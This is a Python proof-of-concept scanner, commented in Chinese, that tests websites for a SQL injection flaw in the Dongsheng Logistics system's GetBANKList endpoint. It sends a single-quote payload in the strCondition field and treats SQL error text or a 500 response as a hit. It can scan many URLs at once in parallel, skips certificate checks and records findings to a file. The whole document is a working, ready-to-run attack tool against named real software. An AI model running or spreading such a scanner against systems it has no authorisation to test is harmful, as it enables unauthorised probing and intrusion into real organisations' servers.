import argparse
import requests
import warnings
from multiprocessing import Pool, Lock

# 忽略 SSL 证书警告
requests.packages.urllib3.disable_warnings()

# 全局初始化多进程锁，防止写文件冲突
file_lock = None

def init_pool(l):
    global file_lock
    file_lock = l

def write_to_file(content):
    """多进程安全写入文件的辅助函数"""
    if file_lock:
        file_lock.acquire()
    try:
        with open("vuln.txt", "a", encoding="utf-8") as f:
            f.write(f"{content}\n")
    finally:
        if file_lock:
            file_lock.release()

def poc(url):
    url = url.strip().rstrip("/")
    if not url.startswith("http"):
        url = "http://" + url

    # 1. 适配新漏洞的 POST 请求路径
    target_url = f"{url}/MvcShipping/MsBaseInfo/GetBANKList"
    
    # 2. 适配新漏洞的 POST 表单数据
    data = {"strCondition": "1'"}

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    }

    try:
        response = requests.post(
            target_url,
            headers=headers,
            data=data,
            timeout=5,
            verify=False,
            allow_redirects=False,
        )

        # 3. 漏洞特征匹配
        # 常见 SQL 注入报错关键字，或者服务器因 SQL 语法错误直接返回 500 状态码
        if (
            "SQL Server" in response.text 
            or "syntax error" in response.text 
            or "SqlException" in response.text
            or response.status_code == 500
        ):
            msg = f"[+] {url} 存在东胜物流GetBANKList SQL注入漏洞"
            print(msg)
            write_to_file(msg)
        else:
            msg = f"[-] {url} 不存在漏洞"
            print(msg)
            write_to_file(msg)

    except requests.RequestException:
        msg = f"[!] {url} 请求失败 (连接超时或拒绝访问)"
        print(msg)
        write_to_file(msg)


def main():
    parser = argparse.ArgumentParser(description="东胜物流 SQL注入检测工具")
    parser.add_argument("-u", "--url", help="单个URL进行检测")
    parser.add_argument("-f", "--file", help="包含多个URL的文件，每行一个URL")
    args = parser.parse_args()

    if args.url:
        poc(args.url)
    elif args.file:
        try:
            with open(args.file, "r", encoding="utf-8") as f:
                urls = [line.strip() for line in f.readlines() if line.strip()]
        except FileNotFoundError:
            print(f"[!] 找不到文件: {args.file}")
            return

        if urls:
            print(f"[*] 开始批量检测，总计目标数: {len(urls)}")
            print("-" * 60)
            
            lock = Lock()
            with Pool(processes=5, initializer=init_pool, initargs=(lock,)) as pool:
                pool.map(poc, urls)
                
            print("-" * 60)
            print("[*] 检测扫描完成！完整报告已保存至 vuln.txt")
    else:
        print("请提供一个URL或一个包含URL的文件。使用 -h 查看帮助。")


if __name__ == "__main__":
    main()